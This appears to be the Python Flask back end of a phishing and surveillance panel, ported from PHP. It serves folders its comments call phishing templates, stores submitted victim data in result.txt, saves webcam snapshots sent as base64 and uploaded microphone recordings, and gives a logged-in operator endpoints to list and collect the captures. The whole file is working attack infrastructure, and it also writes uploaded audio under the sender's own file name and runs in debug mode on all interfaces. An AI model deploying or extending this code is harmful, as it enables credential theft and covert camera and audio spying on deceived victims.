from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, make_response
import os
import json
import re
import base64

BASE_DIR = os.path.dirname(__file__)
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
FLASK_TEMPLATES_DIR = os.path.join(BASE_DIR, 'flask_templates')
CHECK_C_PATH = os.path.join(BASE_DIR, 'check-c.json')
PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')

app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), template_folder=FLASK_TEMPLATES_DIR)
app.secret_key = os.urandom(24)


# Keep legacy asset path used by the original PHP templates (../../assets/...)
@app.route('/assets/<path:filename>')
def legacy_assets(filename):
    return send_from_directory(os.path.join(BASE_DIR, 'assets'), filename)


# (Compatibility routes defined later to avoid duplicate endpoint names)


def load_check_c():
    try:
        with open(CHECK_C_PATH, 'r') as f:
            return json.load(f)
    except Exception:
        return {"token": "", "expired": "yes"}


def save_check_c(data):
    with open(CHECK_C_PATH, 'w') as f:
        json.dump(data, f)


def generate_token():
    import uuid
    uniqid = uuid.uuid4().hex
    api_key = '-'.join([uniqid[i:i+5] for i in range(0, len(uniqid), 5)])
    return api_key


def change_token(token):
    key = load_check_c()
    key['token'] = token
    key['expired'] = 'no'
    save_check_c(key)


def load_php_config(path=PHP_CONFIG_PATH):
    # Naive parser for the simple config.php used in this project
    try:
        text = open(path, 'r').read()
    except Exception:
        return {}

    pattern = re.compile(r'"([^\"]+)"\s*=>\s*\[([^\]]+)\]', re.DOTALL)
    users = {}
    for m in pattern.finditer(text):
        username = m.group(1)
        block = m.group(2)
        pwd_m = re.search(r'"password"\s*=>\s*"([^\"]+)"', block)
        if pwd_m:
            users[username] = {'password': pwd_m.group(1)}
    return users


CONFIG = load_php_config()


@app.route('/')
def index():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        return redirect(url_for('panel'))
    elif session.get('IAm-logined'):
        return redirect(url_for('panel'))
    else:
        return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if session.get('IAm-logined'):
        return redirect(url_for('panel'))

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in CONFIG and CONFIG[username]['password'] == password:
            session['IAm-logined'] = username
            return redirect(url_for('panel'))
        else:
            error = 'Invalid username or password'

    return render_template('login.html', error=error)


@app.route('/panel')
def panel():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        if not session.get('IAm-logined'):
            session['IAm-logined'] = 'yes'
    elif session.get('IAm-logined'):
        client_token = generate_token()
        resp = make_response(render_template('panel.html', username=session.get('IAm-logined')))
        resp.set_cookie('logindata', client_token, max_age=86400*30, path='/')
        change_token(client_token)
        return resp
    else:
        return redirect(url_for('login'))

    return render_template('panel.html', username=session.get('IAm-logined'))


@app.route('/logout')
def logout():
    session.clear()
    resp = redirect(url_for('login'))
    resp.set_cookie('logindata', '', expires=0, path='/')
    return resp


@app.route('/receiver', methods=['POST'])
def receiver():
    if 'send_me_result' in request.form:
        PATH = os.path.join(BASE_DIR, 'templates')
        out = ''
        # Phishing templates are in subdirectories; exclude Flask template files (*.html, *.json, etc.)
        for name in os.listdir(PATH):
            dirpath = os.path.join(PATH, name)
            if os.path.isdir(dirpath) and not name.startswith('.'):
                result_file = os.path.join(dirpath, 'result.txt')
                if os.path.exists(result_file):
                    try:
                        data = open(result_file, 'r', encoding='utf-8', errors='ignore').read()
                        if data.strip():
                            out += data + "\n"
                            open(result_file, 'w').close()
                    except Exception:
                        pass
        return out
    return ''


@app.route('/list_templates')
def list_templates():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files like login.html, panel.html)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)


@app.route('/api/images')
def get_images():
    """API endpoint to list all captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    os.makedirs(images_dir, exist_ok=True)
    
    try:
        files = os.listdir(images_dir)
        images = []
        for f in files:
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                file_path = os.path.join(images_dir, f)
                images.append({
                    'name': f,
                    'url': f'/images/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        images.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'images': images})
    except Exception as e:
        return jsonify({'error': str(e), 'images': []}), 500


@app.route('/api/audio')
def get_audio():
    """API endpoint to list all recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    os.makedirs(sounds_dir, exist_ok=True)
    
    try:
        files = os.listdir(sounds_dir)
        audio_files = []
        for f in files:
            if f.lower().endswith(('.wav', '.mp3', '.m4a', '.ogg', '.webm')):
                file_path = os.path.join(sounds_dir, f)
                audio_files.append({
                    'name': f,
                    'url': f'/sounds/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        audio_files.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'audio': audio_files})
    except Exception as e:
        return jsonify({'error': str(e), 'audio': []}), 500


@app.route('/images/<filename>')
def serve_image(filename):
    """Serve captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    return send_from_directory(images_dir, filename)


@app.route('/sounds/<filename>')
def serve_sound(filename):
    """Serve recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    return send_from_directory(sounds_dir, filename)


# Compatibility routes for original PHP filenames (avoid 404s from existing JS)
@app.route('/list_templates.php', methods=['GET', 'POST'])
def list_templates_php():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)


@app.route('/receiver.php', methods=['POST'])
def receiver_php():
    return receiver()


@app.route('/logout.php')
def logout_php():
    return logout()


@app.route('/index.php')
def index_php():
    return index()


@app.route('/login.php', methods=['GET', 'POST'])
def login_php():
    return login()


@app.route('/panel.php')
def panel_php():
    return panel()


@app.route('/t/<name>/post.php', methods=['POST'])
def template_post_php(name):
    return template_post(name)


@app.route('/t/<name>/handler.php', methods=['POST'])
def template_handler_php(name):
    return template_handler(name)


@app.route('/api/images.php')
def get_images_php():
    return get_images()


@app.route('/api/audio.php')
def get_audio_php():
    return get_audio()


@app.route('/t/<name>/')
def serve_template_index(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if os.path.isdir(dirpath):
        return send_from_directory(dirpath, 'index.html')
    return 'Not found', 404


@app.route('/t/<name>/<path:filename>')
def serve_template_file(name, filename):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if os.path.isdir(dirpath):
        return send_from_directory(dirpath, filename)
    return 'Not found', 404


@app.route('/t/<name>/handler', methods=['POST'])
def template_handler(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404
    data = request.form.get('data')
    if data is None:
        return 'No data', 400
    result_file = os.path.join(dirpath, 'result.txt')
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write(data)
    return 'OK'


@app.route('/t/<name>/post', methods=['POST'])
def template_post(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404

    # If a base64 image field 'cat' is present, save image to ../images
    cat = request.form.get('cat')
    if cat:
        try:
            imgdata = base64.b64decode(cat)
            from datetime import datetime
            fname = 'cam' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.png'
            images_dir = os.path.join(BASE_DIR, 'images')
            os.makedirs(images_dir, exist_ok=True)
            imgpath = os.path.join(images_dir, fname)
            with open(imgpath, 'wb') as f:
                f.write(imgdata)
            # write to result.txt
            result_file = os.path.join(dirpath, 'result.txt')
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write('Image File Was Saved ! > /images/' + fname)
            return 'OK'
        except Exception as e:
            return 'Error: ' + str(e), 500

    # fallback: mirror handler behavior
    data = request.form.get('data')
    if data:
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(data)
        return 'OK'

    return 'No data', 400


@app.route('/t/<name>/upload.php', methods=['POST'])
def template_upload_php(name):
    if 'audio_data' not in request.files:
        return 'No file part', 400
    
    file = request.files['audio_data']
    if file.filename == '':
        return 'No selected file', 400
        
    if file:
        filename = file.filename
        if not filename.endswith('.wav'):
            filename += '.wav'
            
        sounds_dir = os.path.join(BASE_DIR, 'sounds')
        os.makedirs(sounds_dir, exist_ok=True)
        save_path = os.path.join(sounds_dir, filename)
        file.save(save_path)
        
        # Write to result.txt
        dirpath = os.path.join(TEMPLATES_DIR, name)
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"Audio File Was Saved ! > /sounds/{filename}")
            
        return 'OK'
    return 'Error', 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2525, debug=True)
